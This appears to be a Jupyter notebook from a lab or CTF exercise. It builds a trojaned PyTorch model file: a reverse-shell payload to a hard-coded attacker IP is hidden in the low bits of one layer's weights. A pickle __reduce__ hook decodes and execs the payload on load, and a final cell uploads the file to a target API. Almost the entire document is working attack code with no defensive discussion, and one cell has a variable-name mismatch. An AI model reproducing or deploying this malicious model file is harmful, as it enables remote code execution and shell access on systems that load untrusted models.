In [62]:
import struct, torch

In [63]:
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import TensorDataset, DataLoader
import numpy as np

SEED = 1337
np.random.seed(SEED)
torch.manual_seed(SEED)

class SimpleNet(nn.Module):
    def __init__(self, input_size, hidden_size, output_size):
        super().__init__()
        self.fc1 = nn.Linear(input_size, hidden_size)
        self.relu = nn.ReLU()
        self.fc2 = nn.Linear(hidden_size, output_size)
        self.large_layer = nn.Linear(hidden_size, hidden_size * 5)
    def forward(self, x):
        x = self.fc1(x)
        x = self.relu(x)
        x = self.fc2(x)
        return x

input_dim, hidden_dim, output_dim = 10, 64, 1
target_model = SimpleNet(input_dim, hidden_dim, output_dim)

# quick fake training so weights aren't default
X_train = torch.randn(100, input_dim)
true_weights = torch.randn(input_dim, output_dim)
y_train = X_train @ true_weights + torch.randn(100, output_dim) * 0.5
dataloader = DataLoader(TensorDataset(X_train, y_train), batch_size=16)

criterion = nn.MSELoss()
optimizer = optim.Adam(target_model.parameters(), lr=0.01)

target_model.train()
for epoch in range(5):
    for inputs, targets in dataloader:
        optimizer.zero_grad()
        loss = criterion(target_model(inputs), targets)
        loss.backward()
        optimizer.step()

# now this works:
legitimate_state_dict_file = "victim_model_state.pth"
torch.save(target_model.state_dict(), legitimate_state_dict_file)
print(f"Saved to {legitimate_state_dict_file}")

Saved to victim_model_state.pth


In [64]:
legitimate_state_dict_file = "victim_model_state.pth"
torch.save(target_model.state_dict(), legitimate_state_dict_file)

In [65]:
HOST_Ip = "10.10.15.223"
LISTENER_PORT = 443

import socket, subprocess, os, pty, sys, traceback

payload_code_string = f"""
import socket, subprocess, os, pty, sys, traceback
print("[PAYLOAD] Payload starting execution.", file=sys.stderr); sys.stderr.flush()
attacker_ip = '{HOST_IP}'; attacker_port = {LISTENER_PORT}
print(f"[PAYLOAD] Attempting connection to {{attacker_ip}}:{{attacker_port}}...", file=sys.stderr); sys.stderr.flush()
s = None
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(5.0)
    s.connect((attacker_ip, attacker_port)); s.settimeout(None)
    print("[PAYLOAD] Connection successful.", file=sys.stderr); sys.stderr.flush()
    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
    shell = os.environ.get('SHELL', '/bin/bash')
    pty.spawn([shell])
except socket.timeout: print(f"[PAYLOAD] ERROR: Connection timed out.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except ConnectionRefusedError: print(f"[PAYLOAD] ERROR: Connection refused.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except Exception as e: print(f"[PAYLOAD] ERROR: Unexpected error: {{e}}", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
finally:
    print("[PAYLOAD] Payload script finishing.", file=sys.stderr); sys.stderr.flush()
    if s:
        try: s.close()
        except: pass
    os._exit(1)
"""

payload_bytes_to_hide = payload_code_string.encode("utf-8")
print(f"Payload defined and encoded to {len(payload_bytes_to_hide)} bytes.")

Payload defined and encoded to 1298 bytes.


In [66]:
payload_bytes_to_hide = payload_code_string.encode("utf-8")

In [67]:
import struct, torch

def encode_lsb(tensor_orig: torch.Tensor, data_bytes: bytes, num_lsb: int) -> torch.Tensor:
    if tensor_orig.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8. More bits increase distortion.")

    tensor = tensor_orig.clone().detach()
    n_elements = tensor.numel()
    tensor_flat = tensor.flatten()

    data_len = len(data_bytes)
    data_to_embed = struct.pack(">I", data_len) + data_bytes

    total_bits_needed = len(data_to_embed) * 8
    capacity_bits = n_elements * num_lsb
    if total_bits_needed > capacity_bits:
        raise ValueError(f"Tensor too small: needs {total_bits_needed} bits, capacity {capacity_bits} bits.")

    data_iter = iter(data_to_embed)
    current_byte = next(data_iter, None)
    bit_index_in_byte = 7
    element_index = 0
    bits_embedded = 0

    while bits_embedded < total_bits_needed and element_index < n_elements:
        if current_byte is None:
            break
        original_float = tensor_flat[element_index].item()
        packed_float = struct.pack(">f", original_float)
        int_representation = struct.unpack(">I", packed_float)[0]

        mask = (1 << num_lsb) - 1
        data_bits_for_float = 0

        for i in range(num_lsb):
            if current_byte is None:
                break
            data_bit = (current_byte >> bit_index_in_byte) & 1
            data_bits_for_float |= data_bit << (num_lsb - 1 - i)
            bit_index_in_byte -= 1
            if bit_index_in_byte < 0:
                current_byte = next(data_iter, None)
                bit_index_in_byte = 7
            bits_embedded += 1
            if bits_embedded >= total_bits_needed:
                break

        cleared_int = int_representation & (~mask)
        new_int_representation = cleared_int | data_bits_for_float
        new_packed_float = struct.pack(">I", new_int_representation)
        new_float = struct.unpack(">f", new_packed_float)[0]
        tensor_flat[element_index] = new_float
        element_index += 1

    print(f"Encoded {bits_embedded} bits into {element_index} elements using {num_lsb} LSB(s) per element.")
    return tensor


def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -> bytes:
    if tensor_modified.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8.")

    tensor_flat = tensor_modified.flatten()
    n_elements = tensor_flat.numel()
    shared_state = {'element_index': 0}

    def get_bits(count: int) -> list:
        nonlocal shared_state
        bits = []
        while len(bits) < count and shared_state['element_index'] < n_elements:
            current_float = tensor_flat[shared_state['element_index']].item()
            packed_float = struct.pack(">f", current_float)
            int_representation = struct.unpack(">I", packed_float)[0]
            mask = (1 << num_lsb) - 1
            lsb_data = int_representation & mask
            for i in range(num_lsb):
                bit = (lsb_data >> (num_lsb - 1 - i)) & 1
                bits.append(bit)
                if len(bits) == count:
                    break
            shared_state['element_index'] += 1
        if len(bits) < count:
            raise ValueError(f"Tensor ended prematurely. Requested {count} bits, got {len(bits)}.")
        return bits

    try:
        length_bits = get_bits(32)
    except ValueError as e:
        raise ValueError(f"Failed to decode payload length: {e}")

    payload_len_bytes = 0
    for bit in length_bits:
        payload_len_bytes = (payload_len_bytes << 1) | bit

    if payload_len_bytes == 0:
        return b""

    payload_bits = get_bits(payload_len_bytes * 8)

    decoded_bytes = bytearray()
    current_byte_val = 0
    bit_count = 0
    for bit in payload_bits:
        current_byte_val = (current_byte_val << 1) | bit
        bit_count += 1
        if bit_count == 8:
            decoded_bytes.append(current_byte_val)
            current_byte_val = 0
            bit_count = 0

    print(f"Decoded {len(decoded_bytes)} bytes using {num_lsb} LSB(s) per element.")
    return bytes(decoded_bytes)

print("encode_lsb and decode_lsb defined.")

encode_lsb and decode_lsb defined.


In [68]:
import torch, os

NUM_LSB = 2

# load the model you saved earlier — SAME filename as the save step
legitimate_state_dict_file = "victim_model_state.pth"
if not os.path.exists(legitimate_state_dict_file):
    raise FileNotFoundError(f"'{legitimate_state_dict_file}' not found — run the training/save cell first.")

loaded_state_dict = torch.load(legitimate_state_dict_file, weights_only=False)
print("State dict loaded successfully.")

# pick the big tensor as the hiding place
target_key = "large_layer.weight"
original_target_tensor = loaded_state_dict[target_key]
print(f"Target '{target_key}': shape {original_target_tensor.shape}, {original_target_tensor.numel()} elements.")

# capacity check (payload + 4-byte length prefix must fit)
bytes_to_embed = 4 + len(payload_bytes_to_hide)
bits_needed = bytes_to_embed * 8
elements_needed = (bits_needed + NUM_LSB - 1) // NUM_LSB
print(f"Payload needs {elements_needed} elements using {NUM_LSB} LSBs.")
if original_target_tensor.numel() < elements_needed:
    raise ValueError(f"Target tensor '{target_key}' too small for the payload!")

# hide the payload
modified_target_tensor = encode_lsb(original_target_tensor, payload_bytes_to_hide, NUM_LSB)
modified_state_dict = loaded_state_dict.copy()
modified_state_dict[target_key] = modified_target_tensor
print(f"Payload embedded into '{target_key}'. modified_state_dict ready.")

State dict loaded successfully.
Target 'large_layer.weight': shape torch.Size([320, 64]), 20480 elements.
Payload needs 5208 elements using 2 LSBs.
Encoded 10416 bits into 5208 elements using 2 LSB(s) per element.
Payload embedded into 'large_layer.weight'. modified_state_dict ready.


In [69]:
NUM_LSB = 2
legitimate_state_dict_file = "victim_model_state.pth"     # ← same name
loaded_state_dict = torch.load(legitimate_state_dict_file, weights_only=False)
target_key = "large_layer.weight"
# ... capacity check ...
modified_target_tensor = encode_lsb(loaded_state_dict[target_key], payload_bytes_to_hide, NUM_LSB)
modified_state_dict = loaded_state_dict.copy()
modified_state_dict[target_key] = modified_target_tensor

Encoded 10416 bits into 5208 elements using 2 LSB(s) per element.


In [70]:
import pickle, torch, struct, traceback, os, pty, socket, sys, subprocess


class TrojanModelWrapper:
    def __init__(self, modified_state_dict: dict, target_key: str, num_lsb: int):
        if target_key not in modified_state_dict:
            raise ValueError(f"target_key '{target_key}' not found in state_dict.")
        if not isinstance(modified_state_dict[target_key], torch.Tensor):
            raise TypeError(f"Value at '{target_key}' is not a Tensor.")
        if modified_state_dict[target_key].dtype != torch.float32:
            raise TypeError(f"Tensor at '{target_key}' is not float32.")
        if not 1 <= num_lsb <= 8:
            raise ValueError("num_lsb must be between 1 and 8.")

        self.pickled_state_dict_bytes = pickle.dumps(modified_state_dict)
        self.target_key = target_key
        self.num_lsb = num_lsb
        print(f"  [Wrapper Init] Pickled state_dict ({len(self.pickled_state_dict_bytes)} bytes). Ready.")

    def get_state_dict(self):
        try:
            return pickle.loads(self.pickled_state_dict_bytes)
        except Exception as e:
            print(f"Error deserializing internal state_dict: {e}")
            return None

    def __reduce__(self):
        decode_lsb_source = """
import torch, struct, pickle, traceback
def decode_lsb(tensor_modified, num_lsb):
    if tensor_modified.dtype != torch.float32: raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8: raise ValueError("num_lsb must be 1-8.")
    tensor_flat = tensor_modified.flatten(); n_elements = tensor_flat.numel(); element_index = 0
    def get_bits(count):
        nonlocal element_index; bits = []
        while len(bits) < count:
            if element_index >= n_elements: raise ValueError("Tensor ended prematurely.")
            current_float = tensor_flat[element_index].item()
            try: packed_float = struct.pack('>f', current_float); int_representation = struct.unpack('>I', packed_float)[0]
            except struct.error: element_index += 1; continue
            mask = (1 << num_lsb) - 1; lsb_data = int_representation & mask
            for i in range(num_lsb):
                bit = (lsb_data >> (num_lsb - 1 - i)) & 1; bits.append(bit)
                if len(bits) == count: break
            element_index += 1
        return bits
    length_bits = get_bits(32); length_int = 0
    for bit in length_bits: length_int = (length_int << 1) | bit
    payload_len_bytes = length_int
    if payload_len_bytes == 0: return b''
    payload_bits = get_bits(payload_len_bytes * 8)
    decoded_bytes = bytearray(); current_byte_val = 0; bit_count = 0
    for bit in payload_bits:
        current_byte_val = (current_byte_val << 1) | bit; bit_count += 1
        if bit_count == 8: decoded_bytes.append(current_byte_val); current_byte_val = 0; bit_count = 0
    return bytes(decoded_bytes)
"""
        pickled_state_dict_literal = repr(self.pickled_state_dict_bytes)
        embedded_target_key = repr(self.target_key)
        embedded_num_lsb = self.num_lsb

        loader_code = f"""
import pickle, torch, struct, traceback, os, pty, socket, sys, subprocess
{decode_lsb_source}
pickled_state_dict_bytes = {pickled_state_dict_literal}
target_key = {embedded_target_key}
num_lsb = {embedded_num_lsb}
try:
    reconstructed_state_dict = pickle.loads(pickled_state_dict_bytes)
    payload_tensor = reconstructed_state_dict[target_key]
    extracted_payload_bytes = decode_lsb(payload_tensor, num_lsb)
    extracted_payload_code = extracted_payload_bytes.decode('utf-8', errors='replace')
    exec(extracted_payload_code, globals(), locals())
except Exception as e:
    print(f'[!!!] Loader error: {{e}}', file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
"""
        return (exec, (loader_code,))


print("TrojanModelWrapper class defined.")

TrojanModelWrapper class defined.


In [71]:
wrapper_instance = TrojanModelWrapper(
    modified_state_dict=modified_state_dict,
    target_key=target_key,
    num_lsb=NUM_LSB,
)
final_malicious_file = "malicious_trojan_model.pth"
torch.save(wrapper_instance, final_malicious_file)

  [Wrapper Init] Pickled state_dict (88221 bytes). Ready.


In [72]:
   ls -la malicious_trojan_model.pth

-rw-r--r-- 1 nnorian nnorian 255751 Oct 13 11:43 malicious_trojan_model.pth


In [ ]:
import requests, os
api_url = "http://10.129.234.139:5555/upload"  # ← real target IP:port
pickle_file_path = "malicious_trojan_model.pth"

files_to_upload = {
    "model": (os.path.basename(pickle_file_path),
              open(pickle_file_path, "rb"),
              "application/octet-stream")
}
response = requests.post(api_url, files=files_to_upload)
print(response.status_code, response.text)